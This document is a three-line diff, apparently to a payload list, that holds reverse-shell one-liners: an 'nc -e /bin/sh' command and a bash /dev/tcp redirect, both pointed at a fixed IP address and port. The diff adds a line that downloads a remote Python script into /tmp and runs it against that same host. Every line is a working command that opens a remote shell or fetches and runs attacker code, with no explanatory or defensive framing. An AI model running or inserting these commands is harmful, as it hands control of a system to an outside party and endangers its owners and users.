@@ -1,2 +1,3 @@
 nc -e /bin/sh 120.24.234.44 123
 /bin/sh -i > /dev/tcp/120.24.234.44/123 0<&1 2>&1
+wget http://0ke.org/back.py -O /tmp/x.py && python /tmp/x.py 120.24.234.44 123
